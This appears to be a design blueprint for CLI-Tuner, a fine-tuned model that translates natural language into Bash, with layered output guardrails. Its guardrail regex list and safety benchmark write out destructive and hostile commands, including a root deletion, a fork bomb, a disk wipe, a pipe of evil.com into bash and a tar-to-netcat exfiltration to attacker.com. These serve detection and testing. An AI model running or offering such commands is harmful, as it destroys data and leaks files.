# CLI-Tuner Northstar — Production Security Architecture
## Ready Tensor Submission + Security + Operational Maturity

**Version:** 4.0 (Final Architect Blueprint)  
**Owner:** Michael  
**Date:** 2025-01-15  
**Status:** Authoritative — Ready for Implementation

---

## 0. Document Purpose & Authority

### 0.1 What This Document Is

This is the **definitive architectural blueprint** for CLI-Tuner, combining:
- **Ready Tensor Requirements** (academic rigor)
- **Security Architecture** (zero-trust, guardrails, provenance)
- **Operational Maturity** (monitoring, versioning, feedback loops)

**Audience:**
- **Architect (This Claude Project):** Design authority
- **Overseer (VSCode Claude):** Technical reviewer, spec refiner
- **Primary Engineer (Codex):** Implementation executor

---

### 0.2 What This Document Is NOT

❌ Engineering tutorial (no step-by-step instructions)  
❌ Code repository (minimal snippets only)  
❌ Debugging guide (Overseer handles technical issues)  
❌ Enterprise operations manual (no 24/7 SOC, no multi-region)

---

### 0.3 Design Principles

**Security-First:**
- Zero-trust architecture (validate at every boundary)
- LLM is untrusted (always validate outputs)
- Guardrails are architectural, not decorative

**Operational Maturity:**
- Track experiments (W&B)
- Version artifacts (HuggingFace Hub, Git)
- Monitor performance (metrics, logs, feedback)
- Improve continuously (retraining triggers)

**Pragmatic Scope:**
- Local deployment (single-user, consumer GPU)
- Basic monitoring (not enterprise observability stack)
- Reproducibility (same inputs → same outputs)

---

## 1. Project Identity

### 1.1 Mission Statement

**Build a secure, operationally mature LLM system that translates natural language to Bash commands.**

**Why it matters:**
- Demonstrates production LLM engineering (RT requirement)
- Showcases security thinking (portfolio differentiator)
- Proves operational maturity (career readiness)

---

### 1.2 Success Definition

**CLI-Tuner succeeds when:**

**RT Requirements:**
- ✅ Training fits single consumer GPU (24GB VRAM)
- ✅ NL → Bash accuracy improves measurably vs base model
- ✅ General reasoning retained (no catastrophic forgetting)
- ✅ Model reproducible from config alone
- ✅ Publishable with evaluation results and documentation

**Security Requirements:**
- ✅ Zero dangerous commands slip through output validation
- ✅ All data flows cross trust boundaries with validation
- ✅ Provenance tracked (data → model → generation)
- ✅ Feedback loop operational (FP/FN → improvements)

**Operational Requirements:**
- ✅ Model versioned and tracked (HuggingFace Hub, W&B)
- ✅ Performance monitored (latency, validation rates, drift)
- ✅ Deployment automated (CI/CD basics)
- ✅ Rollback capable (blue-green deployment)

---

### 1.3 Non-Goals (Out of Scope)

❌ Multi-region deployment  
❌ 24/7 on-call rotation  
❌ SIEM/SOAR integration  
❌ SOC 2 / ISO 27001 compliance  
❌ Multi-user authentication system  
❌ Distributed tracing (Jaeger/Zipkin)  
❌ Chaos engineering

---

## 2. System Architecture

### 2.1 High-Level Data Flow

```
User Query (Untrusted)
    ↓
[TRUST BOUNDARY #1: INGRESS]
    ↓ Schema validation, length limits, injection detection
Validated Input (Limited Trust)
    ↓
[TRUST BOUNDARY #2: PRE-PROCESSING]
    ↓ Normalization, sanitization, chat template
Normalized Input (Trusted Format)
    ↓
[TRUST BOUNDARY #3: MODEL INFERENCE]
    ↓ LLM generation (UNTRUSTED OUTPUT)
Raw Model Output (Untrusted)
    ↓
[TRUST BOUNDARY #4: OUTPUT VALIDATION] ← CRITICAL
    ↓ Dangerous patterns, format, length, policy
Validated Command (Trusted)
    ↓
[TRUST BOUNDARY #5: EGRESS]
    ↓ Structured response, risk level, provenance
User Receives Command
    ↓
[TRUST BOUNDARY #6: EXECUTION]
    User decides to run (outside system control)
```

---

### 2.2 Security Architecture

#### Trust Boundary Enforcement

**Boundary #1: Ingress (User → System)**
- Schema validation (Pydantic: `CommandRequest`)
- Length limits (query: 3-500 chars)
- Prompt injection detection (system token removal)
- Rate limiting (local: relaxed)

**Boundary #2: Pre-Processing (Validated → Normalized)**
- Query normalization (lowercase, whitespace collapse)
- System token removal (`<|system|>`, `<|assistant|>`)
- Chat template application (Qwen format)
- Provenance logging (request_id, timestamp, user_hash)

**Boundary #3: Model Inference (Normalized → Raw)**
- **LLM TREATED AS UNTRUSTED**
- Deterministic generation (temp=0.0, do_sample=False)
- Confidence estimation (if available from logits)
- Generation logging (prompt_hash, output, latency)

**Boundary #4: Output Validation (Raw → Validated) ← CRITICAL**
- **Zero-tolerance dangerous pattern detection**
- Length validation (3-200 chars)
- Format validation (no markdown, no explanations)
- Policy compliance (configurable rules)
- Risk assessment (safe/review/dangerous)

**Boundary #5: Egress (Validated → User)**
- Structured response (`CommandResponse` schema)
- Risk level flagged (safe/review/dangerous)
- Warning displayed (if high-risk)
- Audit logging (provenance record)

**Boundary #6: Execution (User Decision)**
- No auto-execution (user must copy/paste)
- Clear risk warnings
- User responsibility acknowledged

---

#### Guardrails

**Input Guardrails:**
```python
class CommandRequest(BaseModel):
    query: str = Field(min_length=3, max_length=500)
    shell_type: Literal["bash"] = "bash"
    safety_level: Literal["strict", "moderate"] = "strict"
```

**Output Guardrails:**
```python
ZERO_TOLERANCE_PATTERNS = [
    r'rm\s+-rf\s+/',              # Root deletion
    r':\(\)\{:\|:\&\};:',         # Fork bomb
    r'dd\s+if=.*of=/dev/sd',      # Disk wipe
    r'chmod\s+-R\s+777\s+/',      # Blanket permissions
    r'curl.*\|\s*sh',             # Blind remote execution
    r'wget.*\|\s*sh',
    r'>/dev/sd[a-z]',             # Direct disk write
    r'mkfs',                      # Format disk
]
```

**Validation Flow:**
```python
def validate_output(raw_output: str) -> ValidatedCommand:
    command = extract_command(raw_output)
    
    # CRITICAL: Dangerous pattern check
    if is_dangerous(command):
        raise SecurityError(f"Blocked: {command}")
    
    # Length + format validation
    if not (3 <= len(command) <= 200):
        raise ValidationError("Length violation")
    
    # Policy compliance
    if not complies_with_policy(command):
        raise PolicyError("Policy violation")
    
    return ValidatedCommand(
        command=command,
        risk_level="safe",
        validation_passed=True
    )
```

---

#### Schemas (Type-Safe Data Structures)

**All data flows use validated schemas:**

```python
# Input
class CommandRequest(BaseModel):
    query: str
    shell_type: Literal["bash"] = "bash"
    safety_level: Literal["strict", "moderate"] = "strict"

# Normalized
class NormalizedRequest(BaseModel):
    prompt: str
    original_query: str
    metadata: Dict[str, Any]

# Raw Output
class RawModelOutput(BaseModel):
    text: str
    confidence: Optional[float]
    requires_validation: bool = True  # ALWAYS True

# Validated
class ValidatedCommand(BaseModel):
    command: str
    risk_level: Literal["safe", "review", "dangerous"]
    confidence: float
    validation_results: Dict[str, bool]

# Response
class CommandResponse(BaseModel):
    command: str
    risk_level: Literal["safe", "review", "dangerous"]
    confidence: float
    warning: Optional[str]
    provenance: ProvenanceRecord
    
    class Config:
        frozen = True  # Immutable
```

---

#### Provenance Tracking

**Data Provenance:**
```python
class DataProvenance(BaseModel):
    source: str  # "tldr-pages", "nl2bash"
    source_url: Optional[str]
    collected_date: datetime
    validated: bool
    validation_method: str  # "shellcheck", "manual"
```

**Model Provenance:**
```python
class ModelProvenance(BaseModel):
    base_model: str  # "Qwen/Qwen2.5-Coder-7B-Instruct"
    training_data_hash: str  # SHA256
    config_hash: str  # Axolotl config SHA256
    trained_by: str
    trained_at: datetime
    wandb_run_id: str
    git_commit: str
```

**Generation Provenance:**
```python
class GenerationProvenance(BaseModel):
    request_id: str  # Unique per generation
    model_version: str  # "cli-tuner-v1.0.0"
    timestamp: datetime
    user_id_hash: str  # SHA256 (privacy)
    query_hash: str  # SHA256
    command_generated: str
    validation_passed: bool
```

---

### 2.3 Operational Architecture

#### Experiment Tracking

**Weights & Biases Integration:**
- Every training run logged to W&B
- Metrics: loss, learning rate, GPU utilization
- Artifacts: model checkpoints, configs, eval results
- Run ID recorded in model provenance

**What We Track:**
- Training loss (per step, per epoch)
- Validation loss (per epoch)
- Learning rate schedule
- GPU memory usage
- Hyperparameters (LoRA rank, batch size, etc.)
- Evaluation metrics (exact match, BLEU, command-only rate)

---

#### Model Versioning

**Semantic Versioning:**
```
v1.0.0: Initial release (base Qwen + LoRA)
v1.1.0: Minor improvements (better dataset)
v2.0.0: Major architecture change
```

**HuggingFace Hub:**
- Model weights (`cli-tuner-v1.0.0`)
- Model card (training details, eval results, limitations)
- LoRA adapters (`cli-tuner-adapters-v1.0.0`)

**Git Tags:**
```bash
git tag -a v1.0.0 -m "Initial CLI-Tuner release"
git push origin v1.0.0
```

---

#### Performance Monitoring

**Basic Metrics (Logged):**
```python
class PerformanceMetrics:
    generation_latency_ms: float  # Time to generate
    validation_pass_rate: float   # % commands passing validation
    confidence_score: float       # Model confidence
    risk_level: str              # safe/review/dangerous
    
    # Aggregated (daily)
    avg_latency: float
    validation_failure_rate: float
    dangerous_pattern_detections: int
```

**What We Monitor:**
- Generation latency (p50, p95, p99)
- Validation failure rate (by type: dangerous, format, length)
- Risk level distribution (% safe vs review vs dangerous)
- Model confidence distribution

**Monitoring Tools:**
- W&B (experiment tracking + production monitoring)
- JSON logs (structured, parseable)
- Simple Grafana dashboard (optional, nice-to-have)

---

#### Feedback Loop

**Validation Error Tracking:**
```python
class ValidationError:
    request_id: str
    command_generated: str
    failure_reason: str  # "dangerous_pattern", "format_invalid"
    pattern_matched: Optional[str]
    timestamp: datetime
```

**Feedback Mechanisms:**
1. **Automated Logging**
   - Every blocked command logged
   - Pattern matched recorded
   - Weekly aggregation for analysis

2. **User Reporting**
   - CLI flag: `cli-tuner generate --report-issue`
   - User confirms false positive/negative
   - Stored in feedback database

3. **Model Drift Detection**
   - Weekly evaluation on held-out set
   - Alert if metrics degrade >5%
   - Trigger retraining if >10% degradation

**Feedback → Action Pipeline:**
```
Validation Error Detected
  ↓
Logged to feedback.jsonl
  ↓
Weekly aggregation
  ↓
Pattern identified (e.g., new dangerous variant)
  ↓
Update guardrails OR retrain model
  ↓
Re-test on safety benchmark
  ↓
Deploy updated system
```

---

#### Deployment Strategy

**Blue-Green Deployment:**
```
Current (Blue): cli-tuner-v1.0.0
    ↓
New (Green): cli-tuner-v1.1.0
    ↓
Test Green (smoke tests, safety benchmark)
    ↓
Switch traffic: Blue → Green
    ↓
Monitor for 24 hours
    ↓
If issues: Rollback to Blue (< 5 minutes)
```

**CI/CD Pipeline (GitHub Actions):**
```yaml
on: [push]
jobs:
  test:
    - Lint code
    - Run unit tests
    - Run safety benchmark (100 dangerous commands)
    - Validate no false negatives
  
  deploy:
    - Build Docker image
    - Tag with version
    - Push to registry (optional)
```

---

## 3. Training Architecture (RT Requirements)

### 3.1 Base Model Selection

**Choice: Qwen2.5-Coder-7B-Instruct**

**Rationale:**
- Code-specialized (CLI syntax understanding)
- Instruction-tuned (follows structured prompts)
- 7B parameters (fits 24GB GPU with QLoRA)
- Permissive license (Apache 2.0)

**Locked Decision:** ✅ This is the only model we use.

---

### 3.2 Fine-Tuning Method

**QLoRA (4-bit Quantization + LoRA)**

**Why QLoRA:**
- Full fine-tuning: ~116GB VRAM (infeasible)
- LoRA (BF16): ~18GB VRAM (tight)
- QLoRA (4-bit): ~6-8GB VRAM ✅ (viable)

**LoRA Configuration:**
```yaml
r: 8                               # Rank (adapter capacity)
lora_alpha: 16                     # Scaling factor (2×r)
target_modules: [q_proj, v_proj]   # Query + Value attention
lora_dropout: 0.05                 # Regularization
bias: none                         # Don't adapt bias
```

**Quantization (NF4):**
```yaml
load_in_4bit: true
bnb_4bit_quant_type: nf4           # NormalFloat4
bnb_4bit_use_double_quant: true    # Compress quantization metadata
bnb_4bit_compute_dtype: bfloat16   # Compute precision
```

---

### 3.3 Training Data

**Dataset: `prabhanshubhowal/natural_language_to_linux`**

**Format:**
```json
{
  "instruction": "List all PDF files in current directory",
  "input": "",
  "output": "find . -maxdepth 1 -name '*.pdf'"
}
```

**Preprocessing:**
1. Load from HuggingFace Hub
2. Apply chat template (Qwen format)
3. Validate syntax (shellcheck)
4. Filter dangerous commands (zero-tolerance patterns)
5. Split 80/10/10 (train/val/test)

**Data Provenance:**
- Source: HuggingFace Hub
- Collection date: Recorded
- Validation: shellcheck + manual review
- Dangerous command filtering: Applied

---

### 3.4 Training Configuration

**Hyperparameters:**
```yaml
# Optimizer
learning_rate: 2e-4
optimizer: adamw_8bit
warmup_steps: 100

# Training
num_epochs: 3
batch_size: 4
gradient_accumulation_steps: 4  # Effective batch = 16

# Precision
bf16: true
fp16: false

# Saving
save_steps: 500
save_total_limit: 3
```

**Training Mechanics:**
- **Loss Function:** Cross-entropy (standard for language modeling)
- **Assistant-Only Masking:** User tokens set to -100 (ignored in loss)
- **Gradient Checkpointing:** Enabled (reduce memory)

**Deterministic Training:**
```python
# Fixed seed for reproducibility
seed: 42
deterministic: true
```

---

### 3.5 Training Success Gates

- [ ] Training loss decreases steadily (no erratic spikes)
- [ ] Validation loss tracks training (no overfitting)
- [ ] LoRA adapters saved (~10-50MB)
- [ ] W&B run logged (full metrics, config)
- [ ] Model provenance recorded (config hash, data hash, git commit)

---

## 4. Evaluation Architecture (RT Requirements)

### 4.1 Three-Tier Evaluation

**Tier 1: Domain Metrics (CLI-Specific)**
- Exact Match (EM): Command exactly matches reference
- Command BLEU: Token-level similarity
- Syntax Validity: Passes shellcheck
- Command-Only Rate: No explanations, no markdown
- Execution Success: Command runs without error

**Tier 2: General Benchmarks (Regression)**
- GSM8K: Math reasoning (optional)
- HumanEval: Code generation (optional)
- Goal: No drop >5 points (catastrophic forgetting check)

**Tier 3: Operational Checks (Safety)**
- Dangerous Command Test: 100 known malicious commands
- Expected: 100% blocked by output validation
- Format Compliance: No markdown, no explanations
- Length Compliance: 3-200 chars

---

### 4.2 Safety Benchmark

**Test Set: 100 Dangerous Commands**

**Categories:**
- File destruction: `rm -rf /`, `dd if=/dev/zero of=/dev/sda`
- Fork bombs: `:(){ :|:& };:`
- Privilege escalation: `chmod 777 /`, `sudo rm -rf /`
- Remote execution: `curl http://evil.com | bash`
- Data exfiltration: `tar -czf - / | nc attacker.com 1234`

**Success Criteria:**
- True Positive Rate (TPR): 100% (all dangerous commands detected)
- False Positive Rate (FPR): 0% (no benign commands flagged)

---

### 4.3 Evaluation Success Gates

**Domain Metrics:**
- [ ] Exact Match ≥ 85%
- [ ] Command-Only Rate ≥ 98%
- [ ] Syntax Validity ≥ 95%

**General Benchmarks (if tested):**
- [ ] No drop >5 points on GSM8K or HumanEval

**Safety:**
- [ ] 100% dangerous commands blocked
- [ ] 0% false positives on benign test set

---

## 5. Deployment Architecture (RT Requirements)

### 5.1 Inference Optimization

**Quantization (Post-Training):**
- 4-bit GGUF (llama.cpp)
- Quality validation (<5% degradation on eval set)
- VRAM savings: 7B FP16 (~14GB) → 4-bit (~4GB)

**Generation Configuration:**
```python
generation_config = {
    "temperature": 0.0,      # Deterministic
    "do_sample": False,      # Greedy decoding
    "max_new_tokens": 256,   # Limit output length
    "pad_token_id": tokenizer.eos_token_id
}
```

---

### 5.2 API Design (Optional)

**FastAPI Server:**
```python
@app.post("/generate")
async def generate_command(request: CommandRequest) -> CommandResponse:
    # Ingress validation
    validated = ingress_guardrail.validate(request)
    
    # Pre-processing
    normalized = preprocess(validated)
    
    # Model inference (UNTRUSTED)
    raw_output = model.generate(normalized)
    
    # Output validation (CRITICAL)
    validated_cmd = output_guardrail.validate(raw_output)
    
    # Egress
    return CommandResponse(
        command=validated_cmd.command,
        risk_level=validated_cmd.risk_level,
        confidence=validated_cmd.confidence,
        provenance=create_provenance(request, validated_cmd)
    )
```

**Endpoints:**
- `POST /generate` - Generate command
- `GET /health` - Health check
- `GET /metrics` - Prometheus-style metrics (optional)

---

### 5.3 Deployment Environments

**Local (Development):**
```bash
python cli_tuner.py --query "list all pdf files"
```

**Docker (Portable):**
```dockerfile
FROM python:3.10-slim
COPY models/ /app/models/
COPY scripts/ /app/scripts/
RUN pip install -r requirements.txt
ENTRYPOINT ["python", "cli_tuner.py"]
```

**Deployment Success Gates:**
- [ ] Health check endpoint functional
- [ ] Basic metrics logged (latency, validation rate)
- [ ] Docker image built and tested (<10GB)
- [ ] Inference works in 5 lines of code

---

## 6. Documentation (RT Requirements)

### 6.1 Model Card (HuggingFace Format)

**Sections:**
1. **Model Description**
   - Purpose: NL → Bash translation
   - Architecture: Qwen2.5-Coder-7B-Instruct + QLoRA
   - Training data: prabhanshubhowal/natural_language_to_linux

2. **Training Procedure**
   - Method: QLoRA (r=8, alpha=16)
   - Epochs: 3
   - Hardware: RTX 4090 / A6000
   - Duration: 4-8 hours

3. **Evaluation Results**
   - Exact Match: 85%+
   - Command-Only: 98%+
   - Safety: 100% dangerous commands blocked

4. **Intended Use**
   - Generate Bash commands from natural language
   - Educational/research purposes
   - Not for production without additional guardrails

5. **Limitations**
   - Bash-only (no PowerShell, zsh)
   - May hallucinate flags or options
   - Requires output validation

6. **Ethical Considerations**
   - Potential misuse for malicious commands
   - Built-in guardrails (dangerous pattern detection)
   - User responsibility for execution

7. **Security Considerations**
   - Threat model: LLM generation is untrusted
   - Guardrails: Zero-tolerance dangerous patterns
   - Trust boundaries: 6 validation points
   - Provenance: Full audit trail

---

### 6.2 Repository Documentation

**README.md:**
- Project overview
- Quickstart (5-line inference example)
- Installation instructions
- Training reproduction steps

**ARCHITECTURE.md:**
- System architecture (trust boundaries)
- Security design (guardrails, schemas)
- Operational design (monitoring, versioning)

**EVALUATION.md:**
- Evaluation metrics
- Benchmark results
- Safety test results

**DEPLOYMENT.md:**
- Local deployment guide
- Docker deployment guide
- API usage examples

---

## 7. Operational Maturity

### 7.1 Monitoring Stack

**What We Monitor:**
```
Performance:
- Generation latency (p50, p95, p99)
- Validation pass rate
- Risk level distribution

Quality:
- Model confidence distribution
- Validation failure reasons
- Dangerous pattern detections

System:
- Memory usage (if GPU)
- Error rate
- Request rate (if API)
```

**Monitoring Tools:**
- W&B (experiment tracking + production)
- JSON logs (structured, parseable)
- Simple dashboard (Grafana - optional)

**NOT in scope:**
- Enterprise APM (Datadog, New Relic)
- Distributed tracing (Jaeger, Zipkin)
- PagerDuty integration

---

### 7.2 Incident Response

**Playbook: Dangerous Command Slip (False Negative)**
```
1. Immediately add pattern to zero-tolerance list
2. Deploy updated guardrails (< 5 minutes)
3. Re-test on safety benchmark (100 commands)
4. Log incident (provenance, pattern, fix)
5. Post-mortem (root cause, prevention)
```

**Playbook: Model Degradation**
```
1. Run evaluation on held-out set
2. Compare metrics vs baseline
3. If <10% degradation: schedule retraining
4. If >10% degradation: rollback to previous model
5. Investigate root cause (data drift, concept drift)
```

**Playbook: High Validation Failure Rate**
```
1. Check recent changes (code, model, guardrails)
2. Analyze failure reasons (aggregated logs)
3. If model issue: rollback
4. If guardrail issue: tune thresholds
5. If benign commands blocked: update patterns
```

---

### 7.3 Continuous Improvement

**Feedback Collection:**
- Automated: Every validation error logged
- User-reported: CLI flag (`--report-issue`)
- Expert review: Weekly aggregation analysis

**Retraining Triggers:**
- Quarterly (scheduled)
- Model drift detected (metrics degrade >10%)
- New dangerous pattern discovered (emergency)
- New feedback data (1,000+ examples)

**Retraining Process:**
```
1. Validate new training data (schema, quality)
2. Train with same hyperparameters (reproducibility)
3. Evaluate on same benchmarks (compare metrics)
4. A/B test (v1 vs v2 on subset)
5. Gradual rollout (canary → production)
```

---

## 8. Project Timeline & Phases

### Phase 1: Data Pipeline (Weeks 1-2)
- [ ] Load dataset from HuggingFace
- [ ] Apply chat template formatting
- [ ] Validate syntax (shellcheck)
- [ ] Filter dangerous commands
- [ ] Split 80/10/10
- [ ] Push to Hub with dataset card
- [ ] Record data provenance

**Success Gate:** Clean dataset ready for training

---

### Phase 2: Training (Weeks 2-3)
- [ ] Load Qwen2.5-Coder-7B with QLoRA
- [ ] Configure LoRA (r=8, alpha=16)
- [ ] Verify assistant-only masking
- [ ] Train for 3 epochs with W&B logging
- [ ] Save LoRA adapters
- [ ] Record model provenance

**Success Gate:** Trained model with improving loss curve

---

### Phase 3: Evaluation (Week 3)
- [ ] Domain metrics (EM, BLEU, syntax)
- [ ] General benchmarks (GSM8K - optional)
- [ ] Safety benchmark (100 dangerous commands)
- [ ] Generate evaluation report
- [ ] Document results

**Success Gate:** Metrics meet thresholds (EM ≥85%, Safety 100%)

---

### Phase 4: Quantization (Week 4)
- [ ] Quantize to 4-bit GGUF
- [ ] Re-evaluate (quality check)
- [ ] Benchmark inference (latency, VRAM)
- [ ] Document tradeoffs

**Success Gate:** Quantized model with <5% quality loss

---

### Phase 5: Deployment (Week 4-5)
- [ ] Implement guardrails (all trust boundaries)
- [ ] Create inference script (5-line usage)
- [ ] Build Docker image (optional)
- [ ] Set up basic monitoring (logs, metrics)
- [ ] Configure feedback loop
- [ ] Document deployment guide

**Success Gate:** Working inference system with validation

---

### Phase 6: Documentation & Submission (Week 5)
- [ ] Model card (HuggingFace format)
- [ ] Repository documentation (README, ARCHITECTURE, etc.)
- [ ] Publish model to HuggingFace Hub
- [ ] Final QA (all requirements met)
- [ ] Submit to Ready Tensor

**Success Gate:** RT submission complete

---

## 9. Success Criteria Summary

### RT Requirements (Must-Have)
- ✅ Fine-tuned Qwen2.5-Coder-7B-Instruct with QLoRA
- ✅ Evaluation report (domain + general + safety)
- ✅ Model published on HuggingFace Hub
- ✅ Model card with results
- ✅ Axolotl config (reproducible)
- ✅ Inference works in 5 lines
- ✅ Deployment guide

**Quality Thresholds:**
- Exact Match ≥ 85%
- Command-Only ≥ 98%
- Safety: 100% dangerous commands blocked

---

### Security Requirements (Differentiator)
- ✅ Trust boundaries implemented (6 validation points)
- ✅ Guardrails operational (input + output)
- ✅ Schemas enforced (Pydantic validation)
- ✅ Provenance tracked (data → model → generation)
- ✅ Feedback loop operational (FP/FN logging)
- ✅ Safety benchmark passed (0% false negatives)

---

### Operational Requirements (Portfolio Quality)
- ✅ W&B experiment tracking
- ✅ Model versioning (HuggingFace Hub, Git tags)
- ✅ Performance monitoring (metrics, logs)
- ✅ Deployment automation (CI/CD basics)
- ✅ Rollback capability (blue-green)
- ✅ Incident response playbooks

---

## 10. Repository Structure

```
cli-tuner/
├── .github/
│   └── workflows/
│       └── ci.yml              # CI/CD pipeline
├── configs/
│   ├── axolotl.yaml           # Training config
│   └── security_policy.yaml   # Guardrail rules
├── data/
│   ├── raw/                   # Original dataset
│   └── processed/             # Cleaned, split data
├── models/
│   ├── checkpoints/           # Training checkpoints
│   ├── cli-tuner-adapters/    # LoRA adapters
│   └── provenance.json        # Model provenance
├── guardrails/
│   ├── ingress.py            # Input validation
│   ├── output.py             # Output validation
│   └── patterns.py           # Dangerous patterns
├── evaluation/
│   ├── domain/               # CLI-specific metrics
│   ├── general/              # GSM8K, HumanEval
│   └── safety/               # Dangerous command tests
├── deployment/
│   ├── api/                  # FastAPI (optional)
│   ├── docker/               # Dockerfile
│   └── cli_tuner.py          # CLI interface
├── monitoring/
│   ├── logs/                 # JSON logs
│   └── metrics/              # Performance metrics
├── docs/
│   ├── NORTHSTAR.md          # This document
│   ├── ARCHITECTURE.md       # System design
│   ├── SECURITY.md           # Security architecture
│   ├── MODEL_CARD.md         # HuggingFace model card
│   └── EVALUATION.md         # Evaluation results
└── README.md                 # Project overview
```

---

## 11. Handoff to Overseer

**Overseer Role:**
1. Review this Northstar for technical correctness
2. Refine ambiguities or gaps
3. Create implementation-ready specs for each phase
4. Validate Primary Engineer's code against specs

**Handoff Checklist:**
- [ ] Northstar reviewed and approved
- [ ] Phase 1 spec prepared (data pipeline)
- [ ] Phase 2 spec prepared (training)
- [ ] Phase 3 spec prepared (evaluation)
- [ ] Phase 4 spec prepared (quantization)
- [ ] Phase 5 spec prepared (deployment)
- [ ] Phase 6 spec prepared (documentation)

---

## 12. Status

**Document Status:** ✅ FINAL — Ready for Implementation

**What's Locked:**
- ✅ Base model (Qwen2.5-Coder-7B-Instruct)
- ✅ Method (QLoRA, r=8, alpha=16)
- ✅ Dataset (prabhanshubhowal/natural_language_to_linux)
- ✅ Security architecture (trust boundaries, guardrails)
- ✅ Operational architecture (W&B, versioning, monitoring)
- ✅ Success criteria (RT + Security + Ops)

**Next Step:** Pass to Overseer for Phase 1 implementation spec.

---

**END OF CLI-TUNER NORTHSTAR — PRODUCTION SECURITY ARCHITECTURE**
